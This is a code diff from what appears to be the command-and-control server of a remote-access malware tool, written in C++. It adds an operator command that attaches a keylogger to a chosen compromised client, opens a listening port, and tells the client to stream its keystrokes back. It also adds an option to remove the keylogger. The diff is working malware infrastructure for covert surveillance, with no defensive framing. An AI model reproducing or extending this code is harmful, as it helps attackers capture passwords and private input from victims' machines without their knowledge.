@@ -67,9 +67,9 @@ CommandHandler::CommandHandler(
     EventLog* __p_event_log,
     std::atomic<bool>* __p_shutdown_flag,
     std::string* __p_ip,
-    uint* __p_port,
+    uint __port,
     int* __p_user_verbosity,
-    int __shutdown_event_fd): p_ip_(__p_ip),p_port_(__p_port), p_clients_(__p_clients), p_event_log_(__p_event_log), p_shutdown_flag_(__p_shutdown_flag), p_user_verbosity_(__p_user_verbosity), shutdown_event_fd_(__shutdown_event_fd) {
+    int __shutdown_event_fd): p_ip_(__p_ip),port_(__port), p_clients_(__p_clients), p_event_log_(__p_event_log), p_shutdown_flag_(__p_shutdown_flag), p_user_verbosity_(__p_user_verbosity), shutdown_event_fd_(__shutdown_event_fd) {
     
 
     argument_list_.push_back(Argument(INDEX_ARG, ARG_TYPE_INT, "-i", "--index"));
@@ -77,6 +77,7 @@ CommandHandler::CommandHandler(
     argument_list_.push_back(Argument(HELP_ARG, ARG_TYPE_SET, "-h", "--help"));
     argument_list_.push_back(Argument(KILL_ARG, ARG_TYPE_SET, "-k", "--kill"));
     argument_list_.push_back(Argument(VERBOSITY_ARG, ARG_TYPE_INT, "-v", "--verbosity"));
+    argument_list_.push_back(Argument(REMOVE_ARG, ARG_TYPE_SET, "-rm", "--remove"));
 
     command_map_.emplace("help", Command(
         "Show this help message. For specific command help <command> or <command> -h/--help", 
@@ -114,7 +115,7 @@ CommandHandler::CommandHandler(
         "Start listening the key logs of the selected client. Usage: keylogger -i <client_index>",
         &CommandHandler::keylogger,
         this,
-        {HELP_ARG},
+        {HELP_ARG, REMOVE_ARG},
         {INDEX_ARG}
     ));
     command_map_.emplace("kill", Command(
@@ -348,7 +349,75 @@ void CommandHandler::kill() {
 }
 
 void CommandHandler::keylogger() {
+    int rc;
+    int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
+    if (client_index < 0 || client_index >= p_clients_->size()) {
+        *p_event_log_ << LOG_MUST << RED << "Invalid client index: " << client_index << RESET_C2_FIFO;
+        return;
+    }
+    if (p_clients_->at(client_index) == nullptr || ClientHandler::is_client_up(p_clients_->at(client_index)->socket()) != 0) {
+        *p_event_log_ << LOG_MUST << RED << "Client " << client_index << " is not available" << RESET_C2_FIFO;
+        return;
+    }
+    if (arg_map_.find(REMOVE_ARG) != arg_map_.end()) {
+        // Remove the keylogger
+        rc = p_clients_->at(client_index)->unset_tunnel(KEYLOGGER);
+        if (rc < 0) {
+            *p_event_log_ << LOG_MUST << RED << "Keylogger is not active" << RESET_C2_FIFO;
+        } else {
+            *p_event_log_ << LOG_MUST << GREEN << "Keylogger removed from client " << client_index << RESET_C2_FIFO;
+            send_client(KEYLOGGER, 0, client_index);
+        }
+    } else {
+        int port = find_open_port();
+        if (port < -1) {
+            *p_event_log_ << LOG_MUST << RED << "Failed to find an open port for keylogger" << RESET_C2_FIFO;
+            return;
+        }
+        Keylogger* p_keylogger = new Keylogger();
+        if (p_keylogger == nullptr) {
+            *p_event_log_ << LOG_MUST << RED << "Failed to allocate memory for Keylogger" << RESET_C2_FIFO;
+            return;
+        }
+        rc = p_clients_->at(client_index)->set_tunnel(p_keylogger, KEYLOGGER);
+        if (rc < 0) {
+            *p_event_log_ << LOG_MUST << RED << "Keylogger is already active" << RESET_C2_FIFO;
+            delete p_keylogger;
+        } else {
+            p_keylogger->init(p_ip_, port, p_clients_->at(client_index), p_shutdown_flag_, TCP_BASED);
+            *p_event_log_ << LOG_MUST << GREEN << "Listening for the keylogs for client " << client_index << RESET_C2_FIFO;
+            send_client(KEYLOGGER, port, client_index);
+        }
+    }
     
+    
+}
+
+int CommandHandler::find_open_port() {
+    int sockfd;
+    sockaddr_in addr{};
+
+    for (int port=port_+1;port<65535;port++) {
+        sockfd = socket(AF_INET, SOCK_STREAM, 0);
+        if (sockfd < 0) {
+            *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::find_open_port] Error creating socket: " << strerror(errno) << RESET;
+            return -1;
+        }
+
+        addr.sin_family = AF_INET;
+        addr.sin_addr.s_addr = INADDR_ANY;
+        addr.sin_port = htons(port);
+
+        int opt = 1;
+        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+
+        if (bind(sockfd, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
+            close(sockfd);
+            return port;
+        }
+        close(sockfd);
+    }
+    return -1;
 }
 
 void CommandHandler::execute_command(char* __cmd, int __len) {
